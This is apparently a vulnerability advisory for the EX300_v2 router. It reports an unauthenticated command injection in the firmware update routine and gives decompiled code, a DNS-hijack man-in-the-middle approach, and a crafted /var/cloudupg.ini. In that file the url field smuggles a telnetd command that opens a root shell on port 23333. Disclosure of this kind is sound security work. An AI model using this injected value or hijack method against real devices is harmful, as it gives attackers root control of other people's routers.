### Affected device

production: EX300_v2   
version: V4.0.3c.140_B20210429  

### Vulnerability description

Vulnerability Type: RCE

A command injection was found in EX300_v2, V4.0.3c.140_B20210429. The update process `forceugp`of the router allows unauthenticated remote attackers to achieve remote code execution as root via a MitM attack. 

`forceugp` will read the config file `var/cloudupg.ini` and  try to download firmware. Here we can inject command in parament `url`.  

- forceugp

 ```
	... 
	inifile_get_string("/var/cloudupg.ini", "INFO", "url", url);
  inifile_get_string("/var/cloudupg.ini", "INFO", "magicid", v4);
  v0 = 3;
  if ( (unsigned int)strlen(url) < 0xA )
    return -1;
  while ( 1 )
  {
    sprintf(v2, "wget -O %s  %s", "/var/uImage.img", url); //命令注入
    system(v2);
    sprintf(v2, "md5sum %s | cut -d ' ' -f1", "/var/uImage.img");
    getCmdStr(v2, v6, 33);
 ```



- post to firmware server to check new firmware

![](./src/check.png)

Since device requests by HTTP, so we can hijack dns request , the repeater will connect to the attacker server instead of legal one.  



![](./src/mitm.png)



- /var/cloudupg.ini

```
[status]
status                         = 4
netcheck                       = 0
timestamp                      = 1636514189
download                       = 2
checkend                       = 1
parameter                      = 1

[info]
version                        = hacked.hacked
magicid                        = pass
aprule                         =
time                           = 1
mode                           = 1
url                            = &telnetd -l/bin/sh -p 23333& 2>dev/null&
```



